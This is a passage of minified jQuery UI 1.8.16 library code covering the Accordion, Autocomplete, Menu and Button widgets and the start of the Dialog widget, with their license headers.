d=a.element.find("a").filter(b.navigationFilter).eq(0);if(d.length){var h=d.closest(".ui-accordion-header");a.active=h.length?h:d.closest(".ui-accordion-content").prev()}}a.active=a._findActive(a.active||b.active).addClass("ui-state-default ui-state-active").toggleClass("ui-corner-all").toggleClass("ui-corner-top");a.active.next().addClass("ui-accordion-content-active");a._createIcons();a.resize();a.element.attr("role","tablist");a.headers.attr("role","tab").bind("keydown.accordion",function(f){return a._keydown(f)}).next().attr("role","tabpanel");a.headers.not(a.active||"").attr({"aria-expanded":"false","aria-selected":"false",tabIndex:-1}).next().hide();a.active.length?a.active.attr({"aria-expanded":"true","aria-selected":"true",tabIndex:0}):a.headers.eq(0).attr("tabIndex",0);c.browser.safari||a.headers.find("a").attr("tabIndex",-1);b.event&&a.headers.bind(b.event.split(" ").join(".accordion ")+".accordion",function(f){a._clickHandler.call(a,f,this);f.preventDefault()})},_createIcons:function(){var a=this.options;if(a.icons){c("<span></span>").addClass("ui-icon "+a.icons.header).prependTo(this.headers);this.active.children(".ui-icon").toggleClass(a.icons.header).toggleClass(a.icons.headerSelected);this.element.addClass("ui-accordion-icons")}},_destroyIcons:function(){this.headers.children(".ui-icon").remove();this.element.removeClass("ui-accordion-icons")},destroy:function(){var a=this.options;this.element.removeClass("ui-accordion ui-widget ui-helper-reset").removeAttr("role");this.headers.unbind(".accordion").removeClass("ui-accordion-header ui-accordion-disabled ui-helper-reset ui-state-default ui-corner-all ui-state-active ui-state-disabled ui-corner-top").removeAttr("role").removeAttr("aria-expanded").removeAttr("aria-selected").removeAttr("tabIndex");this.headers.find("a").removeAttr("tabIndex");this._destroyIcons();var b=this.headers.next().css("display","").removeAttr("role").removeClass("ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content ui-accordion-content-active ui-accordion-disabled ui-state-disabled");if(a.autoHeight||a.fillHeight)b.css("height","");return c.Widget.prototype.destroy.call(this)},_setOption:function(a,b){c.Widget.prototype._setOption.apply(this,arguments);a=="active"&&this.activate(b);if(a=="icons"){this._destroyIcons();b&&this._createIcons()}if(a=="disabled")this.headers.add(this.headers.next())[b?"addClass":"removeClass"]("ui-accordion-disabled ui-state-disabled")},_keydown:function(a){if(!(this.options.disabled||a.altKey||a.ctrlKey)){var b=c.ui.keyCode,d=this.headers.length,h=this.headers.index(a.target),f=false;switch(a.keyCode){case b.RIGHT:case b.DOWN:f=this.headers[(h+1)%d];break;case b.LEFT:case b.UP:f=this.headers[(h-1+d)%d];break;case b.SPACE:case b.ENTER:this._clickHandler({target:a.target},a.target);a.preventDefault()}if(f){c(a.target).attr("tabIndex",-1);c(f).attr("tabIndex",0);f.focus();return false}return true}},resize:function(){var a=this.options,b;if(a.fillSpace){if(c.browser.msie){var d=this.element.parent().css("overflow");this.element.parent().css("overflow","hidden")}b=this.element.parent().height();c.browser.msie&&this.element.parent().css("overflow",d);this.headers.each(function(){b-=c(this).outerHeight(true)});this.headers.next().each(function(){c(this).height(Math.max(0,b-c(this).innerHeight()+c(this).height()))}).css("overflow","auto")}else if(a.autoHeight){b=0;this.headers.next().each(function(){b=Math.max(b,c(this).height("").height())}).height(b)}return this},activate:function(a){this.options.active=a;a=this._findActive(a)[0];this._clickHandler({target:a},a);return this},_findActive:function(a){return a?typeof a==="number"?this.headers.filter(":eq("+a+")"):this.headers.not(this.headers.not(a)):a===false?c([]):this.headers.filter(":eq(0)")},_clickHandler:function(a,b){var d=this.options;if(!d.disabled)if(a.target){a=c(a.current_target||b);b=a[0]===this.active[0];d.active=d.collapsible&&b?false:this.headers.index(a);if(!(this.running||!d.collapsible&&b)){var h=this.active;j=a.next();g=this.active.next();e={options:d,newHeader:b&&d.collapsible?c([]):a,oldHeader:this.active,newContent:b&&d.collapsible?c([]):j,oldContent:g};var f=this.headers.index(this.active[0])>this.headers.index(a[0]);this.active=b?c([]):a;this._toggle(j,g,e,b,f);h.removeClass("ui-state-active ui-corner-top").addClass("ui-state-default ui-corner-all").children(".ui-icon").removeClass(d.icons.headerSelected).addClass(d.icons.header);if(!b){a.removeClass("ui-state-default ui-corner-all").addClass("ui-state-active ui-corner-top").children(".ui-icon").removeClass(d.icons.header).addClass(d.icons.headerSelected);a.next().addClass("ui-accordion-content-active")}}}else if(d.collapsible){this.active.removeClass("ui-state-active ui-corner-top").addClass("ui-state-default ui-corner-all").children(".ui-icon").removeClass(d.icons.headerSelected).addClass(d.icons.header);this.active.next().addClass("ui-accordion-content-active");var g=this.active.next(),e={options:d,newHeader:c([]),oldHeader:d.active,newContent:c([]),oldContent:g},j=this.active=c([]);this._toggle(j,g,e)}},_toggle:function(a,b,d,h,f){var g=this,e=g.options;g.toShow=a;g.toHide=b;g.data=d;var j=function(){if(g)return g._completed.apply(g,arguments)};g._trigger("changestart",null,g.data);g.running=b.size()===0?a.size():b.size();if(e.animated){d={};d=e.collapsible&&h?{toShow:c([]),toHide:b,complete:j,down:f,autoHeight:e.autoHeight||e.fillSpace}:{toShow:a,toHide:b,complete:j,down:f,autoHeight:e.autoHeight||e.fillSpace};if(!e.proxied)e.proxied=e.animated;if(!e.proxiedDuration)e.proxiedDuration=e.duration;e.animated=c.isFunction(e.proxied)?e.proxied(d):e.proxied;e.duration=c.isFunction(e.proxiedDuration)?e.proxiedDuration(d):e.proxiedDuration;h=c.ui.accordion.animations;var i=e.duration,k=e.animated;if(k&&!h[k]&&!c.easing[k])k="slide";h[k]||(h[k]=function(l){this.slide(l,{easing:k,duration:i||700})});h[k](d)}else{if(e.collapsible&&h)a.toggle();else{b.hide();a.show()}j(true)}b.prev().attr({"aria-expanded":"false","aria-selected":"false",tabIndex:-1}).blur();a.prev().attr({"aria-expanded":"true","aria-selected":"true",tabIndex:0}).focus()},_completed:function(a){this.running=a?0:--this.running;if(!this.running){this.options.clearStyle&&this.toShow.add(this.toHide).css({height:"",overflow:""});this.toHide.removeClass("ui-accordion-content-active");if(this.toHide.length)this.toHide.parent()[0].className=this.toHide.parent()[0].className;this._trigger("change",null,this.data)}}});c.extend(c.ui.accordion,{version:"1.8.16",animations:{slide:function(a,b){a=c.extend({easing:"swing",duration:300},a,b);if(a.toHide.size())if(a.toShow.size()){var d=a.toShow.css("overflow"),h=0,f={},g={},e;b=a.toShow;e=b[0].style.width;b.width(parseInt(b.parent().width(),10)-parseInt(b.css("paddingLeft"),10)-parseInt(b.css("paddingRight"),10)-(parseInt(b.css("borderLeftWidth"),10)||0)-(parseInt(b.css("borderRightWidth"),10)||0));c.each(["height","paddingTop","paddingBottom"],function(j,i){g[i]="hide";j=(""+c.css(a.toShow[0],i)).match(/^([\d+-.]+)(.*)$/);f[i]={value:j[1],unit:j[2]||"px"}});a.toShow.css({height:0,overflow:"hidden"}).show();a.toHide.filter(":hidden").each(a.complete).end().filter(":visible").animate(g,{step:function(j,i){if(i.prop=="height")h=i.end-i.start===0?0:(i.now-i.start)/(i.end-i.start);a.toShow[0].style[i.prop]=h*f[i.prop].value+f[i.prop].unit},duration:a.duration,easing:a.easing,complete:function(){a.autoHeight||a.toShow.css("height","");a.toShow.css({width:e,overflow:d});a.complete()}})}else a.toHide.animate({height:"hide",paddingTop:"hide",paddingBottom:"hide"},a);else a.toShow.animate({height:"show",paddingTop:"show",paddingBottom:"show"},a)},bounceslide:function(a){this.slide(a,{easing:a.down?"easeOutBounce":"swing",duration:a.down?1E3:200})}}})})(jQuery);

/*
 * jQuery UI Autocomplete 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Autocomplete
 *
 * Depends:
 *jquery.ui.core.js
 *jquery.ui.widget.js
 *jquery.ui.position.js
 */
(function(d){var e=0;d.widget("ui.autocomplete",{options:{appendTo:"body",autoFocus:false,delay:300,minLength:1,position:{my:"left top",at:"left bottom",collision:"none"},source:null},pending:0,_create:function(){var a=this,b=this.element[0].ownerDocument,g;this.element.addClass("ui-autocomplete-input").attr("autocomplete","off").attr({role:"textbox","aria-autocomplete":"list","aria-haspopup":"true"}).bind("keydown.autocomplete",function(c){if(!(a.options.disabled||a.element.propAttr("readOnly"))){g=false;var f=d.ui.keyCode;switch(c.keyCode){case f.PAGE_UP:a._move("previousPage",c);break;case f.PAGE_DOWN:a._move("nextPage",c);break;case f.UP:a._move("previous",c);c.preventDefault();break;case f.DOWN:a._move("next",c);c.preventDefault();break;case f.ENTER:case f.NUMPAD_ENTER:if(a.menu.active){g=true;c.preventDefault()}case f.TAB:if(!a.menu.active)return;a.menu.select(c);break;case f.ESCAPE:a.element.val(a.term);a.close(c);break;default:clearTimeout(a.searching);a.searching=setTimeout(function(){if(a.term!=a.element.val()){a.selectedItem=null;a.search(null,c)}},a.options.delay);break}}}).bind("keypress.autocomplete",function(c){if(g){g=false;c.preventDefault()}}).bind("focus.autocomplete",function(){if(!a.options.disabled){a.selectedItem=null;a.previous=a.element.val()}}).bind("blur.autocomplete",function(c){if(!a.options.disabled){clearTimeout(a.searching);a.closing=setTimeout(function(){a.close(c);a._change(c)},150)}});this._initSource();this.response=function(){return a._response.apply(a,arguments)};this.menu=d("<ul></ul>").addClass("ui-autocomplete").appendTo(d(this.options.appendTo||"body",b)[0]).mousedown(function(c){var f=a.menu.element[0];d(c.target).closest(".ui-menu-item").length||setTimeout(function(){d(document).one("mousedown",function(h){h.target!==a.element[0]&&h.target!==f&&!d.ui.contains(f,h.target)&&a.close()})},1);setTimeout(function(){clearTimeout(a.closing)},13)}).menu({focus:function(c,f){f=f.item.data("item.autocomplete");false!==a._trigger("focus",c,{item:f})&&/^key/.test(c.originalEvent.type)&&a.element.val(f.value)},selected:function(c,f){var h=f.item.data("item.autocomplete"),i=a.previous;if(a.element[0]!==b.activeElement){a.element.focus();a.previous=i;setTimeout(function(){a.previous=i;a.selectedItem=h},1)}false!==a._trigger("select",c,{item:h})&&a.element.val(h.value);a.term=a.element.val();a.close(c);a.selectedItem=h},blur:function(){a.menu.element.is(":visible")&&a.element.val()!==a.term&&a.element.val(a.term)}}).zIndex(this.element.zIndex()+1).css({top:0,left:0}).hide().data("menu");d.fn.bgiframe&&this.menu.element.bgiframe()},destroy:function(){this.element.removeClass("ui-autocomplete-input").removeAttr("autocomplete").removeAttr("role").removeAttr("aria-autocomplete").removeAttr("aria-haspopup");this.menu.element.remove();d.Widget.prototype.destroy.call(this)},_setOption:function(a,b){d.Widget.prototype._setOption.apply(this,arguments);a==="source"&&this._initSource();if(a==="appendTo")this.menu.element.appendTo(d(b||"body",this.element[0].ownerDocument)[0]);a==="disabled"&&b&&this.xhr&&this.xhr.abort()},_initSource:function(){var a=this,b,g;if(d.isArray(this.options.source)){b=this.options.source;this.source=function(c,f){f(d.ui.autocomplete.filter(b,c.term))}}else if(typeof this.options.source==="string"){g=this.options.source;this.source=function(c,f){a.xhr&&a.xhr.abort();a.xhr=d.ajax({url:g,data:c,dataType:"json",autocompleteRequest:++e,success:function(h){this.autocompleteRequest===e&&f(h)},error:function(){this.autocompleteRequest===e&&f([])}})}}else this.source=this.options.source},search:function(a,b){a=a!=null?a:this.element.val();this.term=this.element.val();if(a.length<this.options.minLength)return this.close(b);clearTimeout(this.closing);if(this._trigger("search",b)!==false)return this._search(a)},_search:function(a){this.pending++;this.element.addClass("ui-autocomplete-loading");this.source({term:a},this.response)},_response:function(a){if(!this.options.disabled&&a&&a.length){a=this._normalize(a);this._suggest(a);this._trigger("open")}else this.close();this.pending--;this.pending||this.element.removeClass("ui-autocomplete-loading")},close:function(a){clearTimeout(this.closing);if(this.menu.element.is(":visible")){this.menu.element.hide();this.menu.deactivate();this._trigger("close",a)}},_change:function(a){this.previous!==this.element.val()&&this._trigger("change",a,{item:this.selectedItem})},_normalize:function(a){if(a.length&&a[0].label&&a[0].value)return a;return d.map(a,function(b){if(typeof b==="string")return{label:b,value:b};return d.extend({label:b.label||b.value,value:b.value||b.label},b)})},_suggest:function(a){var b=this.menu.element.empty().zIndex(this.element.zIndex()+1);this._renderMenu(b,a);this.menu.deactivate();this.menu.refresh();b.show();this._resizeMenu();b.position(d.extend({of:this.element},this.options.position));this.options.autoFocus&&this.menu.next(new d.Event("mouseover"))},_resizeMenu:function(){var a=this.menu.element;a.outerWidth(Math.max(a.width("").outerWidth(),this.element.outerWidth()))},_renderMenu:function(a,b){var g=this;d.each(b,function(c,f){g._renderItem(a,f)})},_renderItem:function(a,b){return d("<li></li>").data("item.autocomplete",b).append(d("<a></a>").text(b.label)).appendTo(a)},_move:function(a,b){if(this.menu.element.is(":visible"))if(this.menu.first()&&/^previous/.test(a)||this.menu.last()&&/^next/.test(a)){this.element.val(this.term);this.menu.deactivate()}else this.menu[a](b);else this.search(null,b)},widget:function(){return this.menu.element}});d.extend(d.ui.autocomplete,{escapeRegex:function(a){return a.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&")},filter:function(a,b){var g=new RegExp(d.ui.autocomplete.escapeRegex(b),"i");return d.grep(a,function(c){return g.test(c.label||c.value||c)})}})})(jQuery);(function(d){d.widget("ui.menu",{_create:function(){var e=this;this.element.addClass("ui-menu ui-widget ui-widget-content ui-corner-all").attr({role:"listbox","aria-activedescendant":"ui-active-menuitem"}).click(function(a){if(d(a.target).closest(".ui-menu-item a").length){a.preventDefault();e.select(a)}});this.refresh()},refresh:function(){var e=this;this.element.children("li:not(.ui-menu-item):has(a)").addClass("ui-menu-item").attr("role","menuitem").children("a").addClass("ui-corner-all").attr("tabindex",-1).mouseenter(function(a){e.activate(a,d(this).parent())}).mouseleave(function(){e.deactivate()})},activate:function(e,a){this.deactivate();if(this.hasScroll()){var b=a.offset().top-this.element.offset().top,g=this.element.scrollTop(),c=this.element.height();if(b<0)this.element.scrollTop(g+b);else b>=c&&this.element.scrollTop(g+b-c+a.height())}this.active=a.eq(0).children("a").addClass("ui-state-hover").attr("id","ui-active-menuitem").end();this._trigger("focus",e,{item:a})},deactivate:function(){if(this.active){this.active.children("a").removeClass("ui-state-hover").removeAttr("id");this._trigger("blur");this.active=null}},next:function(e){this.move("next",".ui-menu-item:first",e)},previous:function(e){this.move("prev",".ui-menu-item:last",e)},first:function(){return this.active&&!this.active.prevAll(".ui-menu-item").length},last:function(){return this.active&&!this.active.nextAll(".ui-menu-item").length},move:function(e,a,b){if(this.active){e=this.active[e+"All"](".ui-menu-item").eq(0);e.length?this.activate(b,e):this.activate(b,this.element.children(a))}else this.activate(b,this.element.children(a))},nextPage:function(e){if(this.hasScroll())if(!this.active||this.last())this.activate(e,this.element.children(".ui-menu-item:first"));else{var a=this.active.offset().top,b=this.element.height(),g=this.element.children(".ui-menu-item").filter(function(){var c=d(this).offset().top-a-b+d(this).height();return c<10&&c>-10});g.length||(g=this.element.children(".ui-menu-item:last"));this.activate(e,g)}else this.activate(e,this.element.children(".ui-menu-item").filter(!this.active||this.last()?":first":":last"))},previousPage:function(e){if(this.hasScroll())if(!this.active||this.first())this.activate(e,this.element.children(".ui-menu-item:last"));else{var a=this.active.offset().top,b=this.element.height();result=this.element.children(".ui-menu-item").filter(function(){var g=d(this).offset().top-a+b-d(this).height();return g<10&&g>-10});result.length||(result=this.element.children(".ui-menu-item:first"));this.activate(e,result)}else this.activate(e,this.element.children(".ui-menu-item").filter(!this.active||this.first()?":last":":first"))},hasScroll:function(){return this.element.height()<this.element[d.fn.prop?"prop":"attr"]("scrollHeight")},select:function(e){this._trigger("selected",e,{item:this.active})}})})(jQuery);

/*
 * jQuery UI Button 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Button
 *
 * Depends:
 *jquery.ui.core.js
 *jquery.ui.widget.js
 */
(function(b){var h,i,j,g,l=function(){var a=b(this).find(":ui-button");setTimeout(function(){a.button("refresh")},1)},k=function(a){var c=a.name,e=a.form,f=b([]);if(c)f=e?b(e).find("[name='"+c+"']"):b("[name='"+c+"']",a.ownerDocument).filter(function(){return!this.form});return f};b.widget("ui.button",{options:{disabled:null,text:true,label:null,icons:{primary:null,secondary:null}},_create:function(){this.element.closest("form").unbind("reset.button").bind("reset.button",l);if(typeof this.options.disabled!=="boolean")this.options.disabled=this.element.propAttr("disabled");this._determineButtonType();this.hasTitle=!!this.buttonElement.attr("title");var a=this,c=this.options,e=this.type==="checkbox"||this.type==="radio",f="ui-state-hover"+(!e?" ui-state-active":"");if(c.label===null)c.label=this.buttonElement.html();if(this.element.is(":disabled"))c.disabled=true;this.buttonElement.addClass("ui-button ui-widget ui-state-default ui-corner-all").attr("role","button").bind("mouseenter.button",function(){if(!c.disabled){b(this).addClass("ui-state-hover");this===h&&b(this).addClass("ui-state-active")}}).bind("mouseleave.button",function(){c.disabled||b(this).removeClass(f)}).bind("click.button",function(d){if(c.disabled){d.preventDefault();d.stopImmediatePropagation()}});this.element.bind("focus.button",function(){a.buttonElement.addClass("ui-state-focus")}).bind("blur.button",function(){a.buttonElement.removeClass("ui-state-focus")});if(e){this.element.bind("change.button",function(){g||a.refresh()});this.buttonElement.bind("mousedown.button",function(d){if(!c.disabled){g=false;i=d.pageX;j=d.pageY}}).bind("mouseup.button",function(d){if(!c.disabled)if(i!==d.pageX||j!==d.pageY)g=true})}if(this.type==="checkbox")this.buttonElement.bind("click.button",function(){if(c.disabled||g)return false;b(this).toggleClass("ui-state-active");a.buttonElement.attr("aria-pressed",a.element[0].checked)});else if(this.type==="radio")this.buttonElement.bind("click.button",function(){if(c.disabled||g)return false;b(this).addClass("ui-state-active");a.buttonElement.attr("aria-pressed","true");var d=a.element[0];k(d).not(d).map(function(){return b(this).button("widget")[0]}).removeClass("ui-state-active").attr("aria-pressed","false")});else{this.buttonElement.bind("mousedown.button",function(){if(c.disabled)return false;b(this).addClass("ui-state-active");h=this;b(document).one("mouseup",function(){h=null})}).bind("mouseup.button",function(){if(c.disabled)return false;b(this).removeClass("ui-state-active")}).bind("keydown.button",function(d){if(c.disabled)return false;if(d.keyCode==b.ui.keyCode.SPACE||d.keyCode==b.ui.keyCode.ENTER)b(this).addClass("ui-state-active")}).bind("keyup.button",function(){b(this).removeClass("ui-state-active")});this.buttonElement.is("a")&&this.buttonElement.keyup(function(d){d.keyCode===b.ui.keyCode.SPACE&&b(this).click()})}this._setOption("disabled",c.disabled);this._resetButton()},_determineButtonType:function(){this.type=this.element.is(":checkbox")?"checkbox":this.element.is(":radio")?"radio":this.element.is("input")?"input":"button";if(this.type==="checkbox"||this.type==="radio"){var a=this.element.parents().filter(":last"),c="label[for='"+this.element.attr("id")+"']";this.buttonElement=a.find(c);if(!this.buttonElement.length){a=a.length?a.siblings():this.element.siblings();this.buttonElement=a.filter(c);if(!this.buttonElement.length)this.buttonElement=a.find(c)}this.element.addClass("ui-helper-hidden-accessible");(a=this.element.is(":checked"))&&this.buttonElement.addClass("ui-state-active");this.buttonElement.attr("aria-pressed",a)}else this.buttonElement=this.element},widget:function(){return this.buttonElement},destroy:function(){this.element.removeClass("ui-helper-hidden-accessible");this.buttonElement.removeClass("ui-button ui-widget ui-state-default ui-corner-all ui-state-hover ui-state-active  ui-button-icons-only ui-button-icon-only ui-button-text-icons ui-button-text-icon-primary ui-button-text-icon-secondary ui-button-text-only").removeAttr("role").removeAttr("aria-pressed").html(this.buttonElement.find(".ui-button-text").html());this.hasTitle||this.buttonElement.removeAttr("title");b.Widget.prototype.destroy.call(this)},_setOption:function(a,c){b.Widget.prototype._setOption.apply(this,arguments);if(a==="disabled")c?this.element.propAttr("disabled",true):this.element.propAttr("disabled",false);else this._resetButton()},refresh:function(){var a=this.element.is(":disabled");a!==this.options.disabled&&this._setOption("disabled",a);if(this.type==="radio")k(this.element[0]).each(function(){b(this).is(":checked")?b(this).button("widget").addClass("ui-state-active").attr("aria-pressed","true"):b(this).button("widget").removeClass("ui-state-active").attr("aria-pressed","false")});else if(this.type==="checkbox")this.element.is(":checked")?this.buttonElement.addClass("ui-state-active").attr("aria-pressed","true"):this.buttonElement.removeClass("ui-state-active").attr("aria-pressed","false")},_resetButton:function(){if(this.type==="input")this.options.label&&this.element.val(this.options.label);else{var a=this.buttonElement.removeClass("ui-button-icons-only ui-button-icon-only ui-button-text-icons ui-button-text-icon-primary ui-button-text-icon-secondary ui-button-text-only"),c=b("<span></span>").addClass("ui-button-text").html(this.options.label).appendTo(a.empty()).text(),e=this.options.icons,f=e.primary&&e.secondary,d=[];if(e.primary||e.secondary){if(this.options.text)d.push("ui-button-text-icon"+(f?"s":e.primary?"-primary":"-secondary"));e.primary&&a.prepend("<span class='ui-button-icon-primary ui-icon "+e.primary+"'></span>");e.secondary&&a.append("<span class='ui-button-icon-secondary ui-icon "+e.secondary+"'></span>");if(!this.options.text){d.push(f?"ui-button-icons-only":"ui-button-icon-only");this.hasTitle||a.attr("title",c)}}else d.push("ui-button-text-only");a.addClass(d.join(" "))}}});b.widget("ui.buttonset",{options:{items:":button, :submit, :reset, :checkbox, :radio, a, :data(button)"},_create:function(){this.element.addClass("ui-buttonset")},_init:function(){this.refresh()},_setOption:function(a,c){a==="disabled"&&this.buttons.button("option",a,c);b.Widget.prototype._setOption.apply(this,arguments)},refresh:function(){var a=this.element.css("direction")==="ltr";this.buttons=this.element.find(this.options.items).filter(":ui-button").button("refresh").end().not(":ui-button").button().end().map(function(){return b(this).button("widget")[0]}).removeClass("ui-corner-all ui-corner-left ui-corner-right").filter(":first").addClass(a?"ui-corner-left":"ui-corner-right").end().filter(":last").addClass(a?"ui-corner-right":"ui-corner-left").end().end()},destroy:function(){this.element.removeClass("ui-buttonset");this.buttons.map(function(){return b(this).button("widget")[0]}).removeClass("ui-corner-left ui-corner-right").end().button("destroy");b.Widget.prototype.destroy.call(this)}})})(jQuery);

/*
 * jQuery UI Dialog 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Dialog
 *
 * Depends:
 *jquery.ui.core.js
 *jquery.ui.widget.js
 *  jquery.ui.button.js
 *jquery.ui.draggable.js
 *jquery.ui.mouse.js
 *jquery.ui.position.js
 *jquery.ui.resizable.js
 */
(function(c,l){var m={buttons:true,height:true,maxHeight:true,maxWidth:true,minHeight:true,minWidth:true,width:true},n={maxHeight:true,maxWidth:true,minHeight:true,minWidth:true},o=c.attrFn||{val:true,css:true,html:true,text:true,data:true,width:true,height:true,offset:true,click:true};c.widget("ui.dialog",{options:{autoOpen:true,buttons:{},closeOnEscape:true,closeText:"close",dialogClass:"",draggable:true,hide:null,height:"auto",maxHeight:false,maxWidth:false,minHeight:150,minWidth:150,modal:false,position:{my:"center",at:"center",collision:"fit",using:function(a){var b=c(this).css(a).offset().top;b<0&&c(this).css("top",a.top-b)}},resizable:true,show:null,stack:true,title:"",width:300,zIndex:1E3},_create:function(){this.originalTitle=this.element.attr("title");if(typeof this.originalTitle!=="string")this.originalTitle="";this.options.title=this.options.title||this.originalTitle;var a=this,b=a.options,d=b.title||"&#160;",e=c.ui.dialog.getTitleId(a.element),g=(a.uiDialog=c("<div></div>")).appendTo(document.body).hide().addClass("ui-dialog ui-widget ui-widget-content ui-corner-all "+b.dialogClass).css({zIndex:b.zIndex}).attr("tabIndex",-1).css("outline",0).keydown(function(i){if(b.closeOnEscape&&!i.isDefaultPrevented()&&i.keyCode&&i.keyCode===c.ui.keyCode.ESCAPE){a.close(i);i.preventDefault()}}).attr({role:"dialog","aria-labelledby":e}).mousedown(function(i){a.moveToTop(false,i)});a.element.show().removeAttr("title").addClass("ui-dialog-content ui-widget-content").appendTo(g);var f=(a.uiDialogTitlebar=c("<div></div>")).addClass("ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix").prependTo(g),h=c('<a href="#"></a>').addClass("ui-dialog-titlebar-close ui-corner-all").attr("role","button").hover(function(){h.addClass("ui-state-hover")},function(){h.removeClass("ui-state-hover")}).focus(function(){h.addClass("ui-state-focus")}).blur(function(){h.removeClass("ui-state-focus")}).click(function(i){a.close(i);return false}).appendTo(f);(a.uiDialogTitlebarCloseText=c("<span></span>")).addClass("ui-icon ui-icon-closethick").text(b.closeText).appendTo(h);c("<span></span>").addClass("ui-dialog-title").attr("id",e).html(d).prependTo(f);if(c.isFunction(b.beforeclose)&&!c.isFunction(b.beforeClose))b.beforeClose=b.beforeclose;f.find("*").add(f).disableSelection();b.draggable&&c.fn.draggable&&a._makeDraggable();b.resizable&&c.fn.resizable&&a._makeResizable();a._createButtons(b.buttons);a._isOpen=false;c.fn.bgiframe&&g.bgiframe()},_init:function(){this.options.autoOpen&&this.open()},destroy:function(){var a=this;a.overlay&&a.overlay.destroy();a.uiDialog.hide();a.element.unbind(".dialog").removeData("dialog").removeClass("ui-dialog-content ui-widget-content").hide().appendTo("body");a.uiDialog.remove();a.originalTitle&&a.element.attr("title",a.originalTitle);return a},widget:function(){return this.uiDialog},close:function(a){var b=this,d,e;if(false!==b._trigger("beforeClose",a)){b.overlay&&b.overlay.destroy();b.uiDialog.unbind("keypress.ui-dialog");b._isOpen=false;if(b.options.hide)b.uiDialog.hide(b.options.hide,function(){b._trigger("close",a)});else{b.uiDialog.hide();b._trigger("close",a)}c.ui.dialog.overlay.resize();if(b.options.modal){d=0;c(".ui-dialog").each(function(){if(this!==b.uiDialog[0]){e=c(this).css("z-index");isNaN(e)||(d=Math.max(d,e))}});c.ui.dialog.maxZ=d}return b}},isOpen:function(){return this._isOpen},moveToTop:function(a,b){var d=this,e=d.options;if(e.modal&&!a||!e.stack&&!e.modal)return d._trigger("focus",b);if(e.zIndex>c.ui.dialog.maxZ)c.ui.dialog.maxZ=e.zIndex;if(d.overlay){c.ui.dialog.maxZ+=1;d.overlay.$el.css("z-index",c.ui.dialog.overlay.maxZ=c.ui.dialog.maxZ)}a={scrollTop:d.element.scrollTop(),scrollLeft:d.element.scrollLeft()};c.ui.dialog.maxZ+=1;d.uiDialog.css("z-index",c.ui.dialog.maxZ);d.element.attr(a);d._trigger("focus",b);return d},open:function(){if(!this._isOpen){var a=this,b=a.options,d=a.uiDialog;a.overlay=b.modal?new c.ui.dialog.overlay(a):null;a._size();a._position(b.position);d.show(b.show);a.moveToTop(true);b.modal&&d.bind("keypress.ui-dialog",function(e){if(e.keyCode===c.ui.keyCode.TAB){var g=c(":tabbable",this),f=g.filter(":first");g=g.filter(":last");if(e.target===g[0]&&!e.shiftKey){f.focus(1);return false}else if(e.target===f[0]&&e.shiftKey){g.focus(1);return false}}});c(a.element.find(":tabbable").get().concat(d.find(".ui-dialog-buttonpane :tabbable").get().concat(d.get()))).eq(0).focus();a._isOpen=true;a._trigger("open");return a}},_createButtons:function(a){var b=this,d=false,e=c("<div></div>").addClass("ui-dialog-buttonpane ui-widget-content ui-helper-clearfix"),g=c("<div></div>").addClass("ui-dialog-buttonset").appendTo(e);b.uiDialog.find(".ui-dialog-buttonpane").remove();typeof a==="object"&&a!==null&&c.each(a,function(){return!(d=true)});if(d){c.each(a,function(f,h){h=c.isFunction(h)?{click:h,text:f}:h;var i=c('<button type="button"></button>').click(function(){h.click.apply(b.element[0],arguments)}).appendTo(g);c.each(h,function(j,k){if(j!=="click")j in o?i[j](k):i.attr(j,k)});c.fn.button&&i.button()});e.appendTo(b.uiDialog)}},_makeDraggable:function(){function a(f){return{position:f.position,offset:f.offset}}var b=this,d=b.options,e=c(document),g;b.uiDialog.draggable({cancel:".ui-dialog-content, .ui-dialog-titlebar-close",handle:".ui-dialog-titlebar",containment:"document",start:function(f,h){g=d.height==="auto"?"auto":c(this).height();c(this).height(c(this).height()).addClass("ui-dialog-dragging");b._trigger("dragStart",f,a(h))},drag:function(f,h){b._trigger("drag",f,a(h))},stop:function(f,h){d.position=[h.position.left-e.scrollLeft(),h.position.top-e.scrollTop()];c(this).removeClass("ui-dialog-dragging").height(g);b._trigger("dragStop",f,a(h));c.ui.dialog.overlay.resize()}})},_makeResizable:function(a){function b(f){return{originalPosition:f.originalPosition,originalSize:f.originalSize,position:f.position,size:f.size}}a=a===l?this.options.resizable:a;var d=this,e=d.options,g=d.uiDialog.css("position");a=typeof a==="string"?a:"n,e,s,w,se,sw,ne,nw";d.uiDialog.resizable({cancel:".ui-dialog-content",containment:"document",alsoResize:d.element,maxWidth:e.maxWidth,maxHeight:e.maxHeight,minWidth:e.minWidth,minHeight:d._minHeight(),handles:a,start:function(f,h){c(this).addClass("ui-dialog-resizing");d._trigger("resizeStart",f,b(h))},resize:function(f,h){d._trigger("resize",f,b(h))},stop:function(f,h){c(this).removeClass("ui-dialog-resizing");e.height=c(this).height();e.width=c(this).width();d._trigger("resizeStop",f,b(h));c.ui.dialog.overlay.resize()}}).css("position",g).find(".ui-resizable-se").addClass("ui-icon ui-icon-grip-diagonal-se")},_minHeight:function(){var a=this.options;return a.height==="auto"?a.minHeight:Math.min(a.minHeight,a.height)},_position:function(a){var b=[],d=[0,0],e;if(a){if(typeof a==="string"||typeof a==="object"&&"0"in a){b=a.split?a.split(" "):[a[0],a[1]];if(b.length===1)b[1]=b[0];c.each(["left","top"],function(g,f){if(+b[g]===b[g]){d[g]=b[g];b[g]=f}});a={my:b.join(" "),at:b.join(" "),offset:d.join(" ")}}a=c.extend({},c.ui.dialog.prototype.options.position,a)}else a=c.ui.dialog.prototype.options.position;(e=this.uiDialog.is(":visible"))||this.uiDialog.show();this.uiDialog.css({top:0,left:0}).position(c.extend({of:window},a));e||this.uiDialog.hide()},_setOptions:function(a){var b=this,d={},e=false;c.each(a,function(g,f){b._setOption(g,f);if(g in m)e=true;if(g in 